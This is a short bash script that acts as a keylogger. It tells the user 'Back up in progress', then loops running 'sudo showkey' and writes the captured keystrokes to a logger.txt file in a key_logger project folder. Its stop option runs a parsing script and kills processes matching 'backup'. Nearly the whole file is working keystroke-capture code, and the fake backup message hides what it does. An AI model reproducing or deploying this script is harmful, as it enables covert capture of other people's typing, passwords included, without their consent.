#!/bin/bash
if [[ $1 == "stop" ]]; then 
       python /home/sanjeev/scrapy_project/key_logger/parse.py   
       kill $(ps aux | awk '/[b]ackup/ {print $2}') #the most elegant way to kill this process!
       exit #exit the script itself
fi
if [[ $1 == "start" ]]; then
       echo "Back up in progress........"
fi       
while true
do
  [ "$UID" -eq 0 ] ||  sudo  showkey > /home/sanjeev/scrapy_project/key_logger/logger.txt
    # python /home/sanjeev/scrapy_project/key_logger/parse.py
done
